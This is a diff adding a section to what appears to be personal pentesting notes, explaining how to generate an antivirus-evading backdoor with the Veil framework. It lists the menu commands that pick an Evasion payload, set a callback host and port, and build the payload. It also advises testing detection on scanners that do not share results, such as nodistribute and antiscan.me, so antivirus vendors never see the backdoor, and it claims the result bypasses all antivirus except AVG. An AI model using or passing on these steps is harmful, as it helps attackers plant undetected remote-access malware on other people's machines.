@@ -27,6 +27,51 @@ apt update
 apt install -y veil
 /usr/share/veil/config/setup.sh --force --silent
 ```
+Generating An Undetectable Backdoor  
+```
+use
+1) Evasion =  generates undetectable backdoors for us.
+2) Ordnance = generates the payloads that's used by evasion.
+use 1
+list
+use 15
+set LHOST 10.10.10.10
+set LPORT 8080
+```
+Now, if you generate the backdoor like this,
+you will bypass all antivirus programs except AVG.
+I'm gonna set some optional options
+that really won't do much of a difference.
+They'll just make the backdoor look a bit different.
+```
+set PROCESSORS 1
+set SLEEP 6
+generate
+```
+Let's go ahead and check to see if the backdoor is detected
+by any antivirus programs.  
+You can also use VirusTotal,
+but I don't recommend that and please don't do that,
+because if you do that,
+your backdoor will become less effective.
+Because VirusTotal share the results of their scans
+with antivirus programs.  
+use: https://nodistribute.com/  
+or: https://antiscan.me/  
+it's similar to VirusTotal.
+The only difference
+is it's not gonna share the scan results
+with antivirus programs, so it won't affect your backdoor.
+
+Antivirus programs always update their database
+and Veil also always updates
+the way they generate backdoors.
+So first of all, you want to make sure that you're using
+the latest version of Veil
+and you'll have to experiment with the different payloads
+and different options until you get it to work.  
+Undetectable Backdoors Advance: https://www.youtube.com/watch?v=cgM-_42rWbM  
+
 ## Pentesting Resources
 https://github.com/swisskyrepo/PayloadsAllTheThings  
 https://pentestmonkey.net/  
